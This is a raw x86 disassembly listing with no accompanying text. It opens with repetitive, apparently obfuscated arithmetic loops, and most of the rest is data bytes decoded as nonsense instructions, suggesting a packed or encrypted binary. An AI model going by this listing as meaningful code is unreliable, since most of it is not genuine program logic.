  416ca3:	mov    ebx,DWORD PTR [ebp-0x58]
  416ca6:	add    edx,0x5708e2
  416cac:	imul   edx,ebx
  416caf:	mov    DWORD PTR [ebp-0x58],edx
  416cb2:	mov    edx,DWORD PTR [ebp+0x8]
  416cb5:	mov    ebx,DWORD PTR [ebp-0x54]
  416cb8:	add    edx,0x64f880
  416cbe:	or     edx,ebx
  416cc0:	mov    DWORD PTR [ebp-0x54],edx
  416cc3:	mov    edx,DWORD PTR [ebp+0x8]
  416cc6:	mov    ebx,DWORD PTR [ebp-0x50]
  416cc9:	add    edx,ecx
  416ccb:	xor    edx,ebx
  416ccd:	mov    DWORD PTR [ebp-0x50],edx
  416cd0:	mov    edx,DWORD PTR [ebp+0x8]
  416cd3:	mov    ebx,DWORD PTR [ebp-0x4c]
  416cd6:	add    edx,edi
  416cd8:	and    edx,ebx
  416cda:	mov    DWORD PTR [ebp-0x4c],edx
  416cdd:	mov    edx,DWORD PTR [ebp+0x8]
  416ce0:	mov    ebx,DWORD PTR [ebp-0x48]
  416ce3:	lea    edx,[ebx+edx*1+0x241fcdf]
  416cea:	mov    DWORD PTR [ebp-0x48],edx
  416ced:	mov    edx,DWORD PTR [ebp+0x8]
  416cf0:	mov    ebx,0xfa5e1524
  416cf5:	sub    ebx,edx
  416cf7:	add    ebx,DWORD PTR [ebp-0x44]
  416cfa:	mov    DWORD PTR [ebp-0x44],ebx
  416cfd:	mov    edx,DWORD PTR [ebp+0x8]
  416d00:	xor    edx,eax
  416d02:	add    edx,esi
  416d04:	jne    0x41492d
  416d0a:	jmp    0x416d97
  416d0f:	mov    edx,DWORD PTR [ebp-0x14]
  416d12:	mov    DWORD PTR [ebp+0x8],edx
  416d15:	jmp    0x416d8a
  416d1a:	mov    edx,DWORD PTR [ebp+0x8]
  416d1d:	mov    ebx,DWORD PTR [ebp-0x8]
  416d20:	xor    edx,eax
  416d22:	xor    ebx,eax
  416d24:	sub    edx,ebx
  416d26:	sub    edx,esi
  416d28:	xor    edx,eax
  416d2a:	mov    DWORD PTR [ebp+0x8],edx
  416d2d:	mov    edx,DWORD PTR [ebp+0x8]
  416d30:	mov    ebx,DWORD PTR [ebp-0x58]
  416d33:	add    edx,0x5708e2
  416d39:	imul   edx,ebx
  416d3c:	mov    DWORD PTR [ebp-0x58],edx
  416d3f:	mov    edx,DWORD PTR [ebp+0x8]
  416d42:	mov    ebx,DWORD PTR [ebp-0x54]
  416d45:	add    edx,0x64f880
  416d4b:	or     edx,ebx
  416d4d:	mov    DWORD PTR [ebp-0x54],edx
  416d50:	mov    edx,DWORD PTR [ebp+0x8]
  416d53:	mov    ebx,DWORD PTR [ebp-0x50]
  416d56:	add    edx,ecx
  416d58:	xor    edx,ebx
  416d5a:	mov    DWORD PTR [ebp-0x50],edx
  416d5d:	mov    edx,DWORD PTR [ebp+0x8]
  416d60:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d63:	add    edx,edi
  416d65:	and    edx,ebx
  416d67:	mov    DWORD PTR [ebp-0x4c],edx
  416d6a:	mov    edx,DWORD PTR [ebp+0x8]
  416d6d:	mov    ebx,DWORD PTR [ebp-0x48]
  416d70:	lea    edx,[ebx+edx*1+0x241fcdf]
  416d77:	mov    DWORD PTR [ebp-0x48],edx
  416d7a:	mov    edx,DWORD PTR [ebp+0x8]
  416d7d:	mov    ebx,0xfa5e1524
  416d82:	sub    ebx,edx
  416d84:	add    ebx,DWORD PTR [ebp-0x44]
  416d87:	mov    DWORD PTR [ebp-0x44],ebx
  416d8a:	mov    edx,DWORD PTR [ebp+0x8]
  416d8d:	xor    edx,eax
  416d8f:	add    edx,esi
  416d91:	jne    0x416d1a
  416d97:	mov    edx,DWORD PTR [ebp-0x14]
  416d9a:	mov    DWORD PTR [ebp+0x8],edx
  416d9d:	jmp    0x419172
  416da2:	mov    edx,DWORD PTR [ebp+0x8]
  416da5:	mov    ebx,DWORD PTR [ebp-0x8]
  416da8:	xor    edx,eax
  416daa:	xor    ebx,eax
  416dac:	sub    edx,ebx
  416dae:	sub    edx,esi
  416db0:	xor    edx,eax
  416db2:	mov    DWORD PTR [ebp+0x8],edx
  416db5:	mov    edx,DWORD PTR [ebp+0x8]
  416db8:	mov    ebx,DWORD PTR [ebp-0x58]
  416dbb:	add    edx,0x5708e2
  416dc1:	imul   edx,ebx
  416dc4:	mov    DWORD PTR [ebp-0x58],edx
  416dc7:	mov    edx,DWORD PTR [ebp+0x8]
  416dca:	mov    ebx,DWORD PTR [ebp-0x54]
  416dcd:	add    edx,0x64f880
  416dd3:	or     edx,ebx
  416dd5:	mov    DWORD PTR [ebp-0x54],edx
  416dd8:	mov    edx,DWORD PTR [ebp+0x8]
  416ddb:	mov    ebx,DWORD PTR [ebp-0x50]
  416dde:	add    edx,ecx
  416de0:	xor    edx,ebx
  416de2:	jmp    0x419142
  416de7:	adc    eax,0xa46b3bce
  416dec:	xchg   BYTE PTR ds:0xd7812f8a,al
  416df2:	add    BYTE PTR [eax+ecx*2],bh
  416df5:	dec    eax
  416df6:	jle    0x416e6c
  416df8:	inc    ebp
  416df9:	add    BYTE PTR [ebx-0x7c7ca1c2],0x96
  416e00:	and    ebp,esp
  416e02:	out    dx,eax
  416e03:	adc    edx,DWORD PTR [esi+edx*1-0x7477a60f]
  416e0a:	bound  ebx,QWORD PTR [ecx]
  416e0c:	scas   al,BYTE PTR es:[edi]
  416e0d:	sub    BYTE PTR [edx-0x6a],dh
  416e10:	mov    ah,0x47
  416e12:	pop    esi
  416e13:	mov    ds:0xa1d33138,al
  416e18:	retf   
  416e19:	outs   dx,DWORD PTR ds:[esi]
  416e1a:	call   0x1904:0x1ad4be7b
  416e21:	jo     0x416e18
  416e23:	jmp    0xdadf348f
  416e28:	enter  0x67f2,0x8a
  416e2c:	(bad)  
  416e2d:	push   ds
  416e2e:	adc    cl,BYTE PTR [eax-0x77]
  416e31:	push   esi
  416e32:	pushf  
  416e33:	mov    edx,DWORD PTR [edx+0x2ef35e7d]
  416e39:	aaa    
  416e3a:	jl     0x416e03
  416e3c:	adc    eax,DWORD PTR [esi+0x2f2e5b9a]
  416e42:	xchg   esi,eax
  416e43:	cmp    ch,BYTE PTR [ebx]
  416e45:	loop   0x416e52
  416e47:	sub    bh,BYTE PTR [edi+0x3b618638]
  416e4d:	mov    bl,BYTE PTR [ecx+esi*4-0x477dc2a5]
  416e54:	pop    edx
  416e55:	sub    DWORD PTR [edx],eax
  416e57:	and    bh,BYTE PTR [eax]
  416e59:	mov    cl,0xec
  416e5b:	aas    
  416e5c:	je     0x416dff
  416e5e:	inc    eax
  416e5f:	test   eax,0x46cb9860
  416e64:	cmp    ah,al
  416e66:	cmp    DWORD PTR [esi+0x1f893319],ebx
  416e6c:	sbb    ch,al
  416e6e:	aam    0x36
  416e70:	mov    ds:0xcc295b16,al
  416e75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e76:	out    0x5b,eax
  416e78:	es mov ebp,0xc822494
  416e7e:	fiadd  DWORD PTR [ecx]
  416e80:	and    edi,DWORD PTR [esi*2+0x5c33c25]
  416e87:	inc    edx
  416e88:	cmc    
  416e89:	dec    edi
  416e8a:	inc    esi
  416e8b:	xchg   ebp,eax
  416e8c:	call   DWORD PTR gs:[ecx+0x2d]
  416e90:	dec    ecx
  416e91:	or     edi,DWORD PTR [eax+eax*8-0x75]
  416e95:	fistp  QWORD PTR [edi]
  416e97:	aas    
  416e98:	mov    ds:0x4fb9969e,al
  416e9d:	cmp    al,0xac
  416e9f:	aad    0x7a
  416ea1:	pop    esp
  416ea2:	fs cmp eax,0x3fcc940e
  416ea8:	jne    0x416e93
  416eaa:	popa   
  416eab:	mov    eax,ds:0x8225c183
  416eb0:	ss xchg ecx,eax
  416eb2:	repz adc eax,0x9b91991c
  416eb8:	outs   dx,DWORD PTR ds:[esi]
  416eb9:	std    
  416eba:	xor    BYTE PTR [edi],dh
  416ebc:	(bad)  
  416ebd:	mov    ds:0xb89ca558,eax
  416ec2:	stos   DWORD PTR es:[edi],eax
  416ec3:	xchg   edx,eax
  416ec4:	cwde   
  416ec5:	jno    0x416e71
  416ec7:	sub    eax,0x78b948ab
  416ecc:	test   al,0x39
  416ece:	mov    dl,0xac
  416ed0:	cmp    al,0x97
  416ed3:	in     eax,dx
  416ed4:	mov    esi,fs
  416ed6:	shl    DWORD PTR [eax],1
  416ed8:	adc    eax,0x4f4fdfc
  416edd:	mov    ah,0x81
  416edf:	jb     0x416e99
  416ee1:	(bad)  [ebp-0x27]
  416ee4:	popa   
  416ee5:	aas    
  416ee6:	jne    0x416f45
  416ee8:	mov    al,0xcc
  416eea:	imul   esp,DWORD PTR [ecx-0x4d],0xd5cd7820
  416ef1:	aaa    
  416ef2:	ins    DWORD PTR es:[edi],dx
  416ef3:	in     eax,dx
  416ef4:	cmp    eax,0x9e07c
  416ef9:	mov    eax,cs:0x9550b47a
  416eff:	pop    edi
  416f00:	push   ecx
  416f01:	cmp    DWORD PTR [edx-0xe682293],ebx
  416f07:	cmp    BYTE PTR [ecx-0x29b0df00],ch
  416f0d:	mov    ch,0xd4
  416f0f:	in     eax,0xb4
  416f11:	jae    0x416f3d
  416f13:	(bad)  
  416f14:	lea    ebp,[edi]
  416f16:	jmp    0xdbbe4067
  416f1b:	push   esi
  416f1c:	sbb    dh,dl
  416f1e:	ja     0x416f28
  416f20:	lock xchg esi,eax
  416f22:	aam    0xb3
  416f24:	faddp  st(1),st
  416f26:	push   ecx
  416f27:	sar    bh,cl
  416f29:	scas   eax,DWORD PTR es:[edi]
  416f2a:	hlt    
  416f2b:	fsubr  st,st(7)
  416f2d:	repz cdq 
  416f2f:	jns    0x416f8b
  416f31:	mov    bl,0xd6
  416f33:	int3   
  416f34:	or     edi,DWORD PTR [esi]
  416f36:	xlat   BYTE PTR ds:[ebx]
  416f37:	adc    BYTE PTR [edx],ch
  416f39:	loop   0x416fad
  416f3b:	out    0x51,eax
  416f3d:	lock js 0x416f25
  416f40:	jae    0x416f99
  416f42:	mov    DWORD PTR [edx-0x4db83cd9],edx
  416f48:	mov    esi,0xf28c20a6
  416f4d:	dec    edi
  416f4e:	ss int3 
  416f50:	enter  0xb3fd,0xf9
  416f54:	mov    eax,ds:0x890443b3
  416f59:	sbb    esp,DWORD PTR [edi+ebx*8-0x4d]
  416f5d:	clc    
  416f5e:	dec    ecx
  416f5f:	jle    0x416fa1
  416f61:	fldenv [ecx-0x102e9b1c]
  416f67:	sub    dh,0x3
  416f6a:	loopne 0x416eed
  416f6c:	xor    DWORD PTR [ecx+0x55750a2c],eax
  416f72:	sbb    edi,0x6b
  416f75:	sbb    esi,ebp
  416f77:	pusha  
  416f78:	outs   dx,BYTE PTR ds:[esi]
  416f79:	sub    edx,ebx
  416f7b:	nop
  416f7c:	adc    eax,0x97af2ad3
  416f81:	push   ebx
  416f82:	mov    ds:0x18fd2648,eax
  416f87:	mov    ah,bl
  416f89:	mov    edx,0x57de1636
  416f8e:	pop    es
  416f8f:	sbb    ah,bh
  416f91:	pop    edx
  416f92:	xlat   BYTE PTR ds:[ebx]
  416f93:	xor    al,0x2f
  416f95:	push   0xffffff97
  416f97:	aaa    
  416f98:	adc    bh,bl
  416f9a:	in     eax,0xd9
  416f9c:	mov    ebp,0xb5bd957a
  416fa1:	mov    al,ds:0x53253519
  416fa6:	jl     0x416f72
  416fa8:	std    
  416fa9:	mov    edi,DWORD PTR [eax+ebp*1-0x3e]
  416fad:	add    DWORD PTR [ecx],ebx
  416faf:	and    BYTE PTR [esi],ah
  416fb1:	scas   eax,DWORD PTR es:[edi]
  416fb2:	fwait
  416fb3:	jns    0x416fef
  416fb5:	cli    
  416fb6:	or     ah,BYTE PTR [ecx-0x1e]
  416fb9:	jnp    0x416f96
  416fbb:	jbe    0x417026
  416fbd:	jo     0x416fb7
  416fbf:	mov    eax,ds:0x72f94485
  416fc4:	sub    al,0x64
  416fc6:	inc    eax
  416fc7:	xchg   ebx,eax
  416fc8:	(bad)  
  416fc9:	icebp  
  416fca:	popa   
  416fcb:	xlat   BYTE PTR ds:[ebx]
  416fcc:	or     eax,0x2ddc10e0
  416fd1:	adc    al,0x5d
  416fd3:	pop    edx
  416fd4:	int3   
  416fd5:	or     BYTE PTR [edx-0xbef4730],dh
  416fdb:	mov    edx,0x99965b15
  416fe0:	cmp    eax,0xb26ab581
  416fe5:	mov    ch,0x4e
  416fe7:	push   ebx
  416fe8:	xchg   edx,eax
  416fe9:	mov    cl,0x8a
  416feb:	rcl    bh,0x75
  416fee:	adc    bh,BYTE PTR [eax-0x476a1284]
  416ff4:	xor    BYTE PTR [edi],ch
  416ff6:	add    eax,edx
  416ff8:	push   0x2a887bd8
  416ffd:	int    0x1e
  416fff:	lds    edx,FWORD PTR ds:0x30e851eb
  417005:	or     BYTE PTR [eax+0x2ef0c59d],ah
  41700b:	js     0x41702f
  41700d:	and    eax,0x1c11b8c4
  417012:	sahf   
  417013:	mul    DWORD PTR ds:0xaff08884
  417019:	cli    
  41701a:	mov    edi,0x843ca526
  41701f:	xchg   BYTE PTR [eax-0x16034b01],dl
  417025:	stc    
  417026:	mov    dl,0xd
  417028:	fs mov al,0xab
  41702b:	adc    eax,DWORD PTR [esi-0x33c7cc1e]
  417031:	(bad)  
  417032:	cmp    al,0xc0
  417034:	add    ch,BYTE PTR [esi+0x741e66d3]
  41703a:	test   eax,0xf4a1949
  41703f:	ins    DWORD PTR es:[edi],dx
  417040:	scas   al,BYTE PTR es:[edi]
  417041:	retf   
  417042:	xor    bl,dl
  417044:	pop    es
  417045:	dec    ebx
  417046:	inc    esi
  417047:	pop    ebx
  417048:	and    eax,0x5b18624e
  41704d:	in     al,dx
  41704e:	dec    ebp
  41704f:	mov    cl,0x93
  417051:	add    bh,BYTE PTR [esi+0x5eef3e2f]
  417057:	jp     0x417073
  417059:	mov    al,0x5
  41705b:	adc    eax,0x6376413a
  417060:	stos   DWORD PTR es:[edi],eax
  417061:	jo     0x4170d6
  417063:	stc    
  417064:	mov    al,ds:0x69d4e1bd
  417069:	pop    ds
  41706a:	add    eax,0x917276c0
  41706f:	or     DWORD PTR [edi-0x5a4a1a5d],edx
  417075:	inc    ecx
  417076:	mov    dl,0x26
  417078:	jbe    0x417018
  41707a:	push   es
  41707b:	dec    ebp
  41707c:	adc    al,0x77
  41707e:	cmp    esp,ebx
  417080:	das    
  417081:	sub    ecx,esi
  417083:	cmp    BYTE PTR [eax+0x29],cl
  417086:	ffree  st(6)
  417088:	dec    edx
  417089:	retf   0xb60f
  41708c:	loop   0x417040
  41708e:	or     BYTE PTR [eax+0xa2e2818],dh
  417094:	ror    dh,0x10
  417097:	aas    
  417098:	push   esi
  417099:	xchg   esp,ebp
  41709b:	and    cl,BYTE PTR [eax+0x8]
  41709e:	push   ecx
  41709f:	repz xor ch,BYTE PTR [ebx+ebp*8]
  4170a3:	das    
  4170a4:	sete   dl
  4170a7:	cmp    BYTE PTR [ebx+0x42],ch
  4170aa:	lods   al,BYTE PTR ds:[esi]
  4170ab:	shr    dh,1
  4170ad:	aas    
  4170ae:	inc    ecx
  4170af:	or     BYTE PTR [esp+0x4c505a3f],0x46
  4170b7:	mov    eax,ds:0x58ad3dd
  4170bc:	out    0xc9,eax
  4170be:	xor    al,0xeb
  4170c0:	ret    0x7ae3
  4170c3:	pop    es
  4170c4:	jmp    0x6e83676c
  4170c9:	push   es
  4170ca:	inc    edx
  4170cb:	lods   eax,DWORD PTR ds:[esi]
  4170cc:	sub    DWORD PTR [edx-0x79],eax
  4170cf:	dec    ebx
  4170d0:	mov    ds:0xb5fc9f8c,al
  4170d5:	lods   eax,DWORD PTR ds:[esi]
  4170d6:	adc    bh,bh
  4170d8:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4170da:	cmp    al,0x4b
  4170dc:	out    dx,al
  4170dd:	xor    cl,BYTE PTR [ecx]
  4170df:	jbe    0x417098
  4170e1:	into   
  4170e2:	js     0x417160
  4170e4:	test   edx,esp
  4170e6:	mul    BYTE PTR [ecx+0x39dae2e3]
  4170ec:	or     esi,DWORD PTR [ebx+0x1e]
  4170ef:	adc    ecx,0xd363cf75
  4170f5:	je     0x4170c9
  4170f7:	jg     0x41715c
  4170f9:	push   eax
  4170fa:	cmp    al,0x88
  4170fc:	and    eax,DWORD PTR [ebx+esi*1-0x69b7e17b]
  417103:	sub    eax,0xcce13f1
  417108:	(bad)  
  417109:	icebp  
  41710a:	ror    DWORD PTR [esi+0xc4fbbca],1
  417110:	popf   
  417111:	push   ebp
  417112:	ins    BYTE PTR es:[edi],dx
  417113:	pop    edx
  417114:	and    eax,0x2488c4c5
  417119:	mov    esi,0x81aa0733
  41711e:	out    0x30,eax
  417120:	mov    ebp,0xf2d84d73
  417125:	cmp    DWORD PTR [esi],esp
  417127:	add    DWORD PTR [ecx],0xec26b331
  41712d:	ror    DWORD PTR [esi+0x2cf1ade5],0xad
  417134:	daa    
  417135:	sti    
  417136:	cmp    eax,0xe2236634
  41713b:	adc    bh,BYTE PTR [edx]
  41713d:	dec    esp
  41713e:	pop    ss
  41713f:	stos   BYTE PTR es:[edi],al
  417140:	ins    BYTE PTR es:[edi],dx
  417141:	jle    0x41718a
  417143:	lods   eax,DWORD PTR ds:[esi]
  417144:	xchg   ecx,eax
  417145:	mov    edx,0xd2d2b5b4
  41714a:	dec    ebx
  41714b:	mov    BYTE PTR [esi],cl
  41714d:	je     0x4170ee
  41714f:	pop    ebx
  417150:	cmp    al,0xd2
  417152:	xor    DWORD PTR [edi],0x1708eb60
  417158:	inc    esi
  417159:	mov    DWORD PTR [ebx-0x40a3f9cd],0xa500d0de
  417163:	fld    st(1)
  417165:	nop
  417166:	call   0xd3ed:0xd371724c
  41716d:	pop    es
  41716e:	aas    
  41716f:	mov    al,0x96
  417171:	rcl    DWORD PTR [ebp+eiz*2-0x59c3bc2b],1
  417178:	sti    
  417179:	sub    al,0xeb
  41717b:	jb     0x4171bd
  41717d:	jmp    0x36c01529
  417182:	and    ebx,DWORD PTR [ebx]
  417184:	cs js  0x417178
  417187:	hlt    
  417188:	pop    ebp
  417189:	dec    edi
  41718a:	sub    esi,ebx
  41718c:	stos   BYTE PTR es:[di],al
  41718e:	sub    al,0xae
  417190:	ror    BYTE PTR [ebx-0x495cb573],1
  417196:	adc    edi,DWORD PTR ds:0xb3554358
  41719c:	push   ebp
  41719d:	rcl    ecx,cl
  41719f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171a0:	in     eax,0xe7
  4171a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171a3:	stos   BYTE PTR es:[edi],al
  4171a4:	(bad)  
  4171a5:	jmp    0x41713e
  4171a7:	test   BYTE PTR [ecx-0x2be0c564],al
  4171ad:	sub    al,0x34
  4171af:	adc    dl,BYTE PTR [edi+0x26d7da9f]
  4171b5:	dec    ecx
  4171b6:	jge    0x417150
  4171b8:	push   es
  4171b9:	lahf   
  4171ba:	je     0x4171b4
  4171bc:	push   esp
  4171bd:	push   ds
  4171be:	mov    dh,0xbd
  4171c0:	push   eax
  4171c1:	in     eax,dx
  4171c2:	retf   
  4171c3:	in     al,0xe1
  4171c5:	push   ebx
  4171c6:	xchg   ch,dh
  4171c8:	mov    bh,al
  4171ca:	or     BYTE PTR [edi],dl
  4171cc:	mov    al,BYTE PTR [ebx-0x54]
  4171cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d0:	add    al,0x50
  4171d2:	mov    ebx,0x1378cc5c
  4171d7:	scas   eax,DWORD PTR es:[edi]
  4171d8:	sub    bh,bh
  4171da:	inc    ebp
  4171db:	sub    al,0x9f
  4171dd:	fdiv   st(6),st
  4171df:	std    
  4171e0:	into   
  4171e1:	pusha  
  4171e2:	idiv   DWORD PTR [ecx]
  4171e4:	(bad)  
  4171e5:	rcr    bl,1
  4171e7:	dec    esi
  4171e8:	pop    esp
  4171e9:	repz jecxz 0x4171a4
  4171ec:	inc    edx
  4171ed:	or     eax,0x236a46ad
  4171f2:	inc    esp
  4171f3:	(bad)  
  4171f4:	sub    al,0x38
  4171f6:	addr16 push ds
  4171f8:	inc    ecx
  4171f9:	sbb    BYTE PTR [esi],cl
  4171fb:	pop    ecx
  4171fc:	cmp    DWORD PTR [ebp-0x4ad5c958],0xf373a3d5
  417206:	inc    ebp
  417207:	mov    ecx,0x92f94469
  41720c:	jnp    0x417227
  41720e:	cld    
  41720f:	das    
  417210:	mov    DWORD PTR [edi],ecx
  417212:	xchg   ebx,eax
  417213:	adc    al,0xe0
  417215:	mov    eax,ds:0x5b90374f
  41721a:	shl    DWORD PTR [esi-0x61],cl
  41721d:	int3   
  41721e:	jmp    0x614b463b
  417223:	push   0x1f
  417225:	cmp    al,ch
  417227:	in     al,dx
  417228:	xchg   esi,eax
  417229:	out    dx,al
  41722a:	or     eax,0x894a14a4
  41722f:	not    DWORD PTR [edi-0x221df1ad]
  417235:	pop    es
  417236:	rcl    bl,1
  417238:	das    
  417239:	cmp    BYTE PTR [eax-0x75a7f1ab],0x27
  417240:	fsub   QWORD PTR [eax-0x5243ae8]
  417246:	cwde   
  417247:	jl     0x417239
  417249:	mov    cl,0x22
  41724b:	jae    0x41721f
  41724d:	lods   eax,DWORD PTR ds:[esi]
  41724e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41724f:	in     eax,dx
  417250:	add    eax,0x99dcc46f
  417255:	mov    ecx,0xac5a9243
  41725a:	dec    edx
  41725b:	push   es
  41725c:	sub    al,0x6f
  41725e:	test   DWORD PTR [ecx-0x3be06898],ecx
  417264:	push   edi
  417266:	dec    ebx
  417267:	mov    ebx,0xf916b33f
  41726c:	adc    eax,0x994c5329
  417271:	ja     0x417296
  417273:	xor    al,0xe8
  417275:	push   esi
  417276:	mov    ds:0xfe9bf245,eax
  41727b:	leave  
  41727c:	xchg   esp,eax
  41727d:	pop    edi
  41727e:	test   DWORD PTR [edi-0xb],ebp
  417281:	cmp    BYTE PTR [esi-0x37],0x8c
  417285:	xor    eax,0x18198a2a
  41728a:	sbb    ecx,ecx
  41728c:	adc    BYTE PTR [edx],bl
  41728e:	rol    DWORD PTR ds:0xa5084fc3,0x2e
  417295:	push   es
  417296:	push   esp
  417297:	adc    edi,edi
  417299:	cmp    BYTE PTR [edi+0x56aa1a53],bh
  41729f:	(bad)  
  4172a0:	adc    eax,0xb3e7094
  4172a5:	jmp    0xf7eeffd9
  4172aa:	xor    BYTE PTR [edx],0x25
  4172ad:	(bad)  
  4172ae:	jno    0x4172a1
  4172b0:	jmp    0x417268
  4172b2:	ret    
  4172b3:	loope  0x417282
  4172b5:	xor    BYTE PTR [ebp-0x51],ch
  4172b8:	aas    
  4172b9:	dec    edx
  4172ba:	ret    
  4172bb:	cli    
  4172bc:	repz cmp ecx,ecx
  4172bf:	xor    BYTE PTR [eax+0x3be31c43],cl
  4172c5:	stos   DWORD PTR es:[edi],eax
  4172c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4172c8:	jb     0x4172e9
  4172ca:	sub    dl,BYTE PTR [ebx+0x5a]
  4172cd:	std    
  4172ce:	aas    
  4172cf:	and    al,0x58
  4172d1:	push   ebx
  4172d2:	jge    0x4172d9
  4172d4:	sub    DWORD PTR [ebp-0x5c76452d],ecx
  4172da:	nop
  4172db:	fidivr WORD PTR [eax+0xeac092]
  4172e1:	fadd   DWORD PTR [esi+edi*4]
  4172e4:	aaa    
  4172e5:	mov    fs,WORD PTR [edx]
  4172e7:	mov    eax,0x6c3abcde
  4172ec:	xchg   DWORD PTR [edi+edx*1-0x2],ecx
  4172f0:	inc    esp
  4172f1:	hlt    
  4172f2:	daa    
  4172f3:	call   0x1bac10c1
  4172f8:	xor    eax,0xc8912967
  4172fd:	sbb    al,0x70
  4172ff:	mov    cl,0xae
  417301:	push   0xe1705416
  417306:	test   eax,0xf4a0089b
  41730b:	addr16 ins BYTE PTR es:[di],dx
  41730e:	and    DWORD PTR [ebp-0x17],edx
  417311:	lea    esp,[esi+ecx*1-0x6128d71b]
  417318:	out    dx,eax
  417319:	mov    ds:0xbef47f89,al
  41731e:	jle    0x41738f
  417320:	pop    edi
  417321:	scas   eax,DWORD PTR es:[edi]
  417322:	jb     0x4172fd
  417324:	dec    ebp
  417325:	push   cs
  417326:	out    dx,al
  417327:	enter  0xfbd0,0x74
  41732b:	fwait
  41732c:	add    BYTE PTR [edx],ch
  41732e:	push   edi
  41732f:	hlt    
  417330:	test   BYTE PTR ds:[edi],dh
  417333:	sub    DWORD PTR [esi],0x66
  417336:	aaa    
  417337:	mov    dl,0xf7
  417339:	cmp    esi,DWORD PTR [edi]
  41733b:	xchg   esi,eax
  41733c:	and    ch,BYTE PTR [ebp-0x35]
  41733f:	push   eax
  417340:	enter  0xdfc9,0x44
  417344:	add    eax,0xa9508a7c
  417349:	das    
  41734a:	and    ch,0xaf
  41734d:	ds into 
  41734f:	jl     0x4172dd
  417351:	repnz sub eax,0x7d305232
  417357:	out    dx,eax
  417358:	or     eax,0xe0b10c0a
  41735d:	in     eax,dx
  41735e:	jbe    0x41737e
  417360:	add    al,0x8f
  417362:	and    al,bl
  417364:	sar    DWORD PTR [ebx-0x74],0x70
  417368:	mov    dl,BYTE PTR [edi+ecx*1-0x13]
  41736c:	mov    ch,0xf3
  41736e:	ficomp DWORD PTR [eax+0x6a07ef9e]
  417374:	inc    edi
  417375:	inc    eax
  417376:	sahf   
  417377:	aaa    
  417378:	sub    eax,0xd33be27d
  41737d:	mov    ebp,DWORD PTR es:[edx]
  417380:	xchg   esp,eax
  417381:	and    al,0x9f
  417383:	cmp    al,0x7b
  417385:	mov    ds,WORD PTR [edi]
  417387:	jbe    0x4173d4
  417389:	out    dx,eax
  41738a:	popf   
  41738b:	push   ebx
  41738c:	pop    es
  41738d:	mov    esi,0xa14052c8
  417392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417393:	jmp    0x12d6:0x9d8accfc
  41739a:	fimul  DWORD PTR [edi-0x6d]
  41739d:	popa   
  41739e:	(bad)  
  41739f:	push   esp
  4173a0:	mov    dh,0x23
  4173a2:	mov    esp,0x2d22b758
  4173a7:	in     eax,dx
  4173a8:	mov    esi,0x9c93ed02
  4173ad:	test   DWORD PTR [ebx+0x778027b4],ecx
  4173b3:	push   edi
  4173b4:	push   0xfad12abe
  4173b9:	push   ebp
  4173ba:	popa   
  4173bb:	imul   ebx,ebx,0xd7b184d8
  4173c1:	add    BYTE PTR [edx+0x1b],bl
  4173c4:	adc    BYTE PTR [eax-0x7b],0x32
  4173c8:	mov    esp,0xf28f91f0
  4173cd:	or     edx,DWORD PTR [edx+0x78cc2561]
  4173d3:	repnz shr BYTE PTR [ebx-0x6d],cl
  4173d7:	arpl   WORD PTR ds:0x4984ae36,di
  4173dd:	sub    eax,0x16029714
  4173e2:	imul   ebx,edx,0x2e82acb8
  4173e8:	sar    esi,1
  4173ea:	neg    al
  4173ec:	mov    al,ch
  4173ee:	arpl   WORD PTR [ebx],bx
  4173f0:	enter  0xf7f,0x88
  4173f4:	xchg   ebp,eax
  4173f5:	fld    DWORD PTR [edi+ebp*8-0xe]
  4173f9:	or     esp,edi
  4173fb:	dec    ebp
  4173fc:	xor    DWORD PTR [ecx+ecx*1],ecx
  4173ff:	mov    ecx,0xf2ed9673
  417404:	add    bh,BYTE PTR [edx+0x6f]
  417407:	xchg   DWORD PTR [ebp+0x2226e6e1],ebx
  41740d:	test   BYTE PTR [esi],dh
  41740f:	add    al,0x8a
  417411:	enter  0xac26,0xcf
  417415:	and    bl,dl
  417417:	adc    edi,DWORD PTR [esi]
  417419:	addr16 data16 (bad) 
  41741c:	pop    ebp
  41741d:	idiv   DWORD PTR [edx-0x34e296e4]
  417423:	les    ebp,FWORD PTR [ebx+0x16]
  417426:	add    al,0x0
  417428:	add    eax,0x18fe8e49
  41742d:	cwde   
  41742e:	ins    BYTE PTR es:[edi],dx
  41742f:	outs   dx,BYTE PTR ds:[esi]
  417430:	adc    al,0x92
  417432:	dec    edx
  417433:	mov    ds:0xf9ccf452,eax
  417438:	push   esi
  417439:	pop    ss
  41743a:	fwait
  41743b:	daa    
  41743c:	inc    ecx
  41743d:	sub    edx,ebx
  41743f:	sub    al,0x82
  417441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417442:	in     al,0x55
  417444:	or     al,0x3c
  417446:	(bad)  
  417447:	push   ebp
  417448:	mov    ds:0x719a0fe5,al
  41744d:	adc    ch,al
  41744f:	(bad)  
  417450:	sbb    bl,BYTE PTR [ecx-0x5e513fd0]
  417456:	jmp    0x417445
  417458:	lock sbb DWORD PTR [eax],ecx
  41745b:	xchg   esp,eax
  41745c:	iret   
  41745d:	mov    eax,0x739eccfe
  417462:	sub    BYTE PTR [ebx],bl
  417464:	ficomp DWORD PTR [esp+esi*2-0x73917de7]
  41746b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41746c:	arpl   ax,ax
  41746e:	and    BYTE PTR [esi+0x49],ah
  417471:	shl    DWORD PTR [eax+0x4d],0x3b
  417475:	test   al,0xda
  417477:	cs enter 0xa680,0xd6
  41747c:	mov    ebp,0x61bee6e2
  417481:	loope  0x4174d5
  417483:	in     eax,dx
  417484:	pop    ecx
  417485:	in     eax,0x8f
  417487:	xchg   edi,eax
  417488:	cmp    DWORD PTR [edi-0x292729b3],esi
  41748e:	fldenv [esi]
  417490:	push   0x45
  417492:	imul   DWORD PTR [edi+0x2539caec]
  417498:	push   ds
  417499:	jmp    0xfa04:0x10f6aa80
  4174a0:	add    eax,0x96ffb3b0
  4174a5:	(bad)  
